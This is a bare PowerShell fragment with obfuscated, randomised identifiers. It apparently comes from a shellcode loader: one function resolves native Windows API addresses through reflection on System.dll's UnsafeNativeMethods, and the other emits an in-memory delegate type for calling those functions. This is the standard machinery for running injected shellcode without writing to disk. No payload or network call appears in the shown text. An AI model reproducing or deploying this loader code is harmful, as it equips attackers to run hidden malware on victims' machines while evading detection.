function fBbE {
        Param ($yf_B, $oJBo)
        $klhh = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $klhh.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($klhh.GetMethod('GetModuleHandle')).Invoke($null, @($yf_B)))), $oJBo))
}

function u5Do {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $ySh,
                [Parameter(Position = 1)] [Type] $cm = [Void]
        )

        $g9 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $g9.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ySh).SetImplementationFlags('Runtime, Managed')
        $g9.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $cm, $ySh).SetImplementationFlags('Runtime, Managed')

        return $g9.CreateType()
}